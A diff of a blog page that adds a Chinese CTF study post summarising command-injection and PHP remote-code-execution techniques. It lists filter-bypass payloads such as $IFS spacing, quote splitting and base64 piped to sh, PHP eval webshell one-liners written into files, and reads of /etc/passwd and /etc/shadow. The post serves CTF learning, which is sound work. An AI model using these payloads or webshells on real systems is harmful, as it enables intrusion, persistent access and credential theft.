@@ -130,7 +130,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -189,6 +189,606 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CJ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Echo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">CTF命令执行总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-02-26 22:57:00 / Modified: 23:47:47" itemprop="dateCreated datePublished" datetime="2022-02-26T22:57:00+08:00">2022-02-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>11k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>10 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x01-基础命令符号类"><a href="#0x01-基础命令符号类" class="headerlink" title="0x01 基础命令符号类"></a>0x01 基础命令符号类</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#①转义字符</span></span><br><span class="line">windows中^</span><br><span class="line">linux中\</span><br><span class="line"><span class="comment">#②多条命令执行连接的符号</span></span><br><span class="line">windows中&amp;&amp; || %0a;</span><br><span class="line">linux下 &amp;&amp; || ; $() <span class="string">``</span> %0a  %0d</span><br><span class="line"><span class="comment">#③注释字符</span></span><br><span class="line">windows下::</span><br><span class="line">linux下<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-常见的命令类"><a href="#0x02-常见的命令类" class="headerlink" title="0x02 常见的命令类"></a>0x02 常见的命令类</h2><p>读取文件的命令</p>
+<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#读取文件</span></span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">show_source()  file_get_contents</span><br><span class="line"><span class="meta">#glob() 函数返回匹配指定模式的文件名或目录。</span></span><br><span class="line"><span class="meta">#举个例子:</span></span><br><span class="line">glob(<span class="string">&quot;*&quot;</span>) 匹配任意文件</span><br><span class="line">glob(<span class="string">&quot;*.txt&quot;</span>)匹配以txt为后缀的文件</span><br><span class="line"><span class="meta">#打印文件的命令</span></span><br><span class="line">print_r();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>找文件命令,如找flag.txt文件方法</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -name flag.txt</span><br><span class="line"><span class="builtin-name">find</span> / -name *.txt #查找所有txt文件方法</span><br><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span>看看有s属性文件</span><br><span class="line"><span class="comment">#或者find / -name f&#123;l,m&#125;ag.txt/进行通配出字符</span></span><br><span class="line"><span class="comment">#结合grep命令一起使用</span></span><br><span class="line"><span class="builtin-name">find</span> / -name <span class="string">&quot;*.txt&quot;</span> |xargs grep <span class="string">&quot;www.dutycode.com&quot;</span></span><br><span class="line"><span class="comment">#不知道为什么会出现</span></span><br><span class="line">paths must precede expression: 类型的问题</span><br></pre></td></tr></table></figure>
+
+<p>查看linux内核版本命令</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -<span class="keyword">a</span></span><br><span class="line">dir d:\ <span class="comment">#列出目录类</span></span><br></pre></td></tr></table></figure>
+
+<p>unix中常见命令</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ll 列目录、文件（相当于Windows下dir)</span><br><span class="line">pwd 查看当前绝对路径</span><br><span class="line">wget 下载指定的url文件</span><br><span class="line">cat <span class="regexp">/proc/</span><span class="number">1</span>/cgroup 查看是否处在docker虚拟机中</span><br><span class="line"><span class="comment">#如果无ifconfig和无IP命令的话,可以利用proc文件方式查看</span></span><br><span class="line">cat <span class="regexp">/proc/</span>net/fib_trie</span><br><span class="line">cat <span class="regexp">/etc/</span>sysconfig/network</span><br></pre></td></tr></table></figure>
+
+<p>eval–&gt;可计算某个字符串,并执行其中的的 JavaScript 代码<br> 典型构造是执行代码</p>
+<p>1.利用system执行的典型方法</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> $cmd</span><br><span class="line"><span class="comment">#即构造</span></span><br><span class="line">cmd=<span class="keyword">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="comment">#即列出这个文件的相关内容</span></span><br><span class="line"><span class="keyword">system</span>(“ls -al /etc/passwd /etc/shadow”);</span><br><span class="line">cmd=<span class="keyword">system</span>(<span class="string">&quot;cat flag_1171&quot;</span>);</span><br><span class="line"><span class="comment">#骚思路</span></span><br><span class="line"><span class="comment">#绕过</span></span><br><span class="line">c=<span class="keyword">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);</span><br><span class="line"><span class="comment">#--&gt;即代通配符方法读取思路</span></span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;cat /etc/passwd&quot;</span>)</span><br><span class="line">&lt;=&gt;</span><br><span class="line"><span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;cat /etc/passwd&quot;</span>);</span><br><span class="line">&lt;=&gt;</span><br><span class="line">(sy.(st).em)(<span class="string">&quot;cat /etc/passwd&quot;</span>);</span><br><span class="line">&lt;=&gt;还可以用注释方法绕过</span><br><span class="line"><span class="string">&quot;system/*fthgb666*/(&quot;</span>cat /etc/passwd);<span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;=&gt;</span></span><br><span class="line"><span class="string">&quot;</span><span class="keyword">system</span>/*fthgb666*<span class="regexp">/(wh./</span>*fthgb666*<span class="regexp">/(oa)/</span>*fthgb666*<span class="regexp">/.mi);&quot;</span></span><br><span class="line"><span class="regexp">&lt;=&gt;</span></span><br><span class="line"><span class="regexp">&quot;(sy./</span>*fthgb666*<span class="regexp">/(st)/</span>*fthgb666*<span class="regexp">/.em)/</span>*fthgb666*<span class="regexp">/(wh./</span>*fthgb666*<span class="regexp">/(oa)/</span>*fthgb666*/.mi);<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">命令执行函数</span><br><span class="line"><span class="function"><span class="title">system</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">shell_exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">popen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">proc_open</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">pcntl_exec</span><span class="params">()</span></span></span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226231322115.png" alt="image-20220226231322115"></p>
+<p>2.写一句话木马,利用echo代写一句话马</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">127.0.0.1 &amp; echo &quot;</span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(@@\<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml">&quot; &gt; 3.php</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>base64的使用</strong></p>
+<p>bin为binary的简写主要放置一些 <a target="_blank" rel="noopener" href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64,bzip2等</p>
+<p>这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php</p>
+<p><strong>bzip2的使用</strong></p>
+<p>bzip2是linux下面的压缩文件的命令<br>我们可以通过该命令压缩flag.php 然后进行下载<br>payload：?c=/???/???/????2 ????.???    ?c=/???/????2 ????.???<br>也就是/usr/bin/bzip2 flag.php<br>然后访问/flag.php.bz2进行下载获得flag.php</p>
+<h2 id="0x03-常见绕过8种方法"><a href="#0x03-常见绕过8种方法" class="headerlink" title="0x03 常见绕过8种方法"></a>0x03 常见绕过8种方法</h2><h3 id="有字母数字rce"><a href="#有字母数字rce" class="headerlink" title="有字母数字rce"></a>有字母数字rce</h3><p>1)命令拼接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=who</span><br><span class="line">b=ami</span><br><span class="line">$a<span class="variable">$b</span> //输出whoami</span><br></pre></td></tr></table></figure>
+
+<p>2)常用字符使用–&gt;常用符号</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;            表示将任务置于后台执行</span><br><span class="line">;            多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">&amp;&amp;           只有在 &amp;&amp; 左边的命令返回真<span class="comment">(命令返回值 $? == 0)</span>,&amp;&amp;右边的命令才会被执行。</span><br><span class="line">||           只有在 || 左边的命令返回假<span class="comment">(命令返回值 $? == 1)</span>,||右边的命令才会被执行。</span><br><span class="line"><span class="meta">%</span><span class="number">0</span>a          </span><br><span class="line"><span class="meta">%</span><span class="number">0</span>d            </span><br><span class="line">| <span class="comment">(管道符)</span>     |表示管道，上一条命令的输出，作为下一条命令的参数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo qwe ; ls           <span class="regexp">//</span>会先输出字符qwe,然后执行ls</span><br><span class="line">q=l; w=s; e=<span class="string">&quot; -al&quot;</span>; <span class="variable">$q</span><span class="variable">$w</span><span class="variable">$e</span>   <span class="regexp">//</span>执行ls -al命令</span><br><span class="line">qwe | ls                <span class="regexp">//</span>执行后面的命令,前面的不执行</span><br><span class="line"><span class="comment">#最常用;和|符号</span></span><br></pre></td></tr></table></figure>
+
+<p>3)linux中默认的字符命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;    <span class="comment">#l</span></span><br><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">2</span>:<span class="number">1</span>&#125;    <span class="comment">#s</span></span><br><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;<span class="variable">$</span>&#123;PATH:<span class="number">2</span>:<span class="number">1</span>&#125; <span class="comment">#拼接后是ls,执行命令</span></span><br><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;s           <span class="comment">#拼接后是ls,执行命令</span></span><br><span class="line"><span class="comment">#即直接这个命令即可完事</span></span><br><span class="line"><span class="variable">$</span>&#123;SHLVL&#125;       //一般是一个个位数</span><br><span class="line"><span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;     //1，表示结果的字符长度</span></span><br><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>:<span class="variable">$</span>&#123;<span class="comment">#&#125;:$&#123;#SHLVL&#125;&#125;       //表示/</span></span><br><span class="line"><span class="variable">$</span>&#123;USER&#125;        //www<span class="literal">-data</span>   <span class="number">99</span>%默认是这个</span><br><span class="line"><span class="variable">$</span>&#123;PHP_VERSION:~A&#125;       //<span class="number">2</span></span><br><span class="line"><span class="variable">$</span>&#123;USER:~<span class="variable">$</span>&#123;PHP_VERSION:~A&#125;:<span class="variable">$</span>&#123;PHP_VERSION:~A&#125;&#125;         //at</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span>:<span class="number">0</span>:<span class="number">1</span>&#125;</span><br><span class="line">获取变量<span class="built_in">PWD</span>的第一个字符</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="number">1</span>&#125;</span><br><span class="line">可以为空。为空的部分就当作<span class="number">0</span>了</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span><span class="comment">#??????&#125;</span></span><br><span class="line"><span class="variable">$</span>&#123;变量<span class="comment">#字符串&#125;表示在变量中。截取字符串右边的值。可以用模糊匹配。截取PWD的最后一位</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span>%??????&#125;</span><br><span class="line"><span class="variable">$</span>&#123;变量%字符串&#125;表示在变量中。截取字符串左边的值。可以用模糊匹配。截取<span class="built_in">PWD</span>的第一位</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#PWD&#125;</span></span><br><span class="line">获取变量<span class="built_in">PWD</span>的长度</span><br><span class="line">AASAA;<span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#_&#125;</span></span><br><span class="line"><span class="variable">$_</span>。表示上一个命令的返回结果。这样就可以构造任意数字</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#A&#125;</span></span><br><span class="line">由于变量A没定义。所以他的长度为<span class="number">0</span>.</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$OPTIND</span></span><br><span class="line">这个也可以获取数字<span class="number">1</span></span><br><span class="line">&gt;B;<span class="built_in">echo</span> <span class="variable">$</span>?</span><br><span class="line">最后运行的命令的结束代码,可以获得数字<span class="number">0</span></span><br><span class="line">&lt;B;<span class="built_in">echo</span> <span class="variable">$</span>?</span><br><span class="line">最后运行的命令的结束代码,可以获得数字<span class="number">1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$RANDOM</span></span><br><span class="line">可以生成随机数。可以配合<span class="comment">#构造6543这几种数字。概率比较大。还可以配合截取。获得数字</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#$&#125;</span></span><br><span class="line"><span class="variable">$</span><span class="variable">$</span>是程序PID。<span class="comment">#获取长度。看运气咯</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;</span></span><br><span class="line">SHLVL貌似是一个shell终端深度。。然后<span class="comment">#可以获取数字1</span></span><br><span class="line"><span class="variable">$</span>&#123;USER&#125;        //www<span class="literal">-data</span></span><br></pre></td></tr></table></figure>
+
+<p>4）绕–&gt;空格</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通用绕过</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line"><span class="comment">#linux下绕过</span></span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$1</span></span><br><span class="line"><span class="variable">$</span>&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span></span><br><span class="line">&lt;     比如<span class="built_in">cat</span>&lt;a.tct:表示<span class="built_in">cat</span> a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line"><span class="comment">#windows环境下绕空格</span></span><br><span class="line">~<span class="number">10</span>,<span class="number">1</span>%</span><br><span class="line">~表示为截取符,该语句的含义为从第十个开始截取且获取一个字符串</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以利用这种思路去写马</span><br><span class="line">eval(file_get_contents(<span class="string">&quot;php://input&quot;</span>));</span><br><span class="line"></span><br><span class="line">然后post</span><br><span class="line">fputs(fopen(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]); ?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>5)绕cat</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代替cat方法</span></span><br><span class="line"> cat</span><br><span class="line"> tac</span><br><span class="line"> more</span><br><span class="line"> less</span><br><span class="line"> head</span><br><span class="line"> tail</span><br><span class="line"> nl</span><br><span class="line"> sed</span><br><span class="line"> <span class="keyword">sort</span></span><br><span class="line"> uniq</span><br><span class="line"> rev</span><br><span class="line"> od%09<span class="string">`ls`</span> 利用转进制显示</span><br><span class="line"> <span class="comment">#代替空格的方法</span></span><br><span class="line"> IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</span><br><span class="line"> <span class="comment">#过滤了目录分隔符/ #利用cd执行到目录里后在进行绕</span></span><br><span class="line"> <span class="comment">#如</span></span><br><span class="line"> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>;cd flag_is_here;cat flag_5898818519729.php |base64</span><br><span class="line"> <span class="comment">#过滤了运算符|等</span></span><br><span class="line"> <span class="comment">#即不可以</span></span><br><span class="line"> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>;cd flag_297281061019145.php |base64</span><br><span class="line"> <span class="comment">#绕方法</span></span><br><span class="line"> base64 flag_297281061019145.php</span><br><span class="line">c=echo(<span class="string">`more%09f*`</span>);</span><br><span class="line"><span class="comment">#绕隔离符类--&gt;即|,;类</span></span><br><span class="line"><span class="comment">#可代这个--&gt;注意直接输入到url编码中,防止被转义</span></span><br><span class="line">%0a</span><br></pre></td></tr></table></figure>
+
+<p>6)绕过关键字</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">①单引号和双引号绕过</span><br><span class="line">比如：<span class="keyword">ca</span>’&#x27;t flag 或<span class="keyword">ca</span><span class="string">&quot;&quot;</span>t flag</span><br><span class="line">②反斜杠绕过或者&lt;&lt;绕过</span><br><span class="line">比如：<span class="keyword">ca</span>\t <span class="keyword">fl</span>\ag <span class="keyword">ca</span>&lt;&lt;t</span><br><span class="line">③过滤目录分隔符 /</span><br><span class="line">可以使用;和<span class="keyword">cd</span>到目录然后使用<span class="keyword">cat</span>抓取</span><br><span class="line">④拼接绕过</span><br><span class="line">比如：a=<span class="keyword">l</span>;b=s;a aab</span><br><span class="line">a aab就代表<span class="keyword">ls</span></span><br><span class="line">⑤编码绕过</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">wh\o\ami    <span class="comment">//反斜线绕过</span></span><br><span class="line">who<span class="string">&quot;a&quot;</span>mi    <span class="comment">//双引号绕过</span></span><br><span class="line">whoa<span class="string">&#x27;m&#x27;</span>i    <span class="comment">//单引号绕过</span></span><br><span class="line">whoam``i    <span class="comment">//反引号绕过</span></span><br><span class="line"><span class="keyword">echo</span> d2hvYW1p|base64 -d|sh  <span class="comment">//base64绕过,其中d2hvYW1p是whoami的base64编码</span></span><br><span class="line"><span class="keyword">echo</span> d2hvYW1p|base64 -d|bash<span class="comment">//base64绕过,其中d2hvYW1p是whoami的base64编码</span></span><br><span class="line">`<span class="keyword">echo</span> d2hvYW1p|base64 -d` <span class="comment">//将其base64解码,然后用反引号来执行命令</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">77686</span>F616D69 | xxd -r -p | bash <span class="comment">//hex绕过,其中77686F616D69是whoami的hex编码</span></span><br><span class="line"><span class="comment">//$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:</span></span><br><span class="line">wh$<span class="number">1</span>oami</span><br><span class="line">who$@ami</span><br><span class="line">whoa$*mi</span><br><span class="line"><span class="comment">#⑥借助文件中其他文件的字符串进行绕</span></span><br><span class="line">如</span><br><span class="line">test.php中存在该命令</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hello，lemon&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">即可利用<span class="keyword">echo</span> `expr substr $(awk NR==<span class="number">1</span> test.php) <span class="number">1</span> <span class="number">1</span>`</span><br><span class="line">进行执行&lt;</span><br></pre></td></tr></table></figure>
+
+<p>7)绕文件名</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> <span class="built_in">fl</span>[<span class="type">abc</span>]g.php               <span class="comment">#匹配[abc]中的任何一个</span></span><br><span class="line"><span class="built_in">cat</span> f[<span class="type">a</span>-<span class="type">z</span>]ag.txt               <span class="comment">#匹配a-z范围的任何字符</span></span><br><span class="line"><span class="built_in">cat</span> fla*                       <span class="comment">#用*匹配任意</span></span><br><span class="line">a=f;d=ag;c=l;<span class="built_in">cat</span> <span class="variable">$a</span><span class="variable">$c</span><span class="variable">$d</span>.php 表示<span class="built_in">cat</span> flag.php <span class="comment">#内联执行</span></span><br><span class="line"><span class="comment">#利用正则:比如要读取etc/passwd</span></span><br><span class="line"><span class="built_in">cat</span> /???/??????</span><br><span class="line"><span class="built_in">cat</span> /???/pass*</span><br><span class="line"><span class="built_in">cat</span> /etc<span class="variable">$u</span>/passwd</span><br></pre></td></tr></table></figure>
+
+<p>8)绕过滤了system</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">system</span>()<span class="comment">#有回显</span></span><br><span class="line">passthru()</span><br><span class="line"><span class="keyword">exec</span>()</span><br><span class="line">shell_exec()</span><br><span class="line">popen() </span><br><span class="line">proc_open() </span><br><span class="line">pcntl_exec() </span><br><span class="line"><span class="comment">#反引号 </span></span><br><span class="line">c=echo <span class="string">`cat f*`</span>;</span><br></pre></td></tr></table></figure>
+
+<p>9)典型限制长度类rce执行</p>
+<p>1.)15个字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>  \<span class="meta">&lt;?php</span> &gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>\(&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \<span class="variable">$_GET</span>&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \[<span class="number">1</span>\]&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \)\;&gt;&gt;<span class="number">1</span></span><br><span class="line">mv <span class="number">1</span> <span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
+
+<p>2.)7个字符</p>
+<p> 1、命令+&gt;文件名可以生产文件(命令可以为空)<br> 2、ls -t可以将文件按时间顺序排列<br> 3、sh命令可以执行sh脚本<br> 4、base64命令可以避免特殊字符<br> 5、\可以分行输入命令</p>
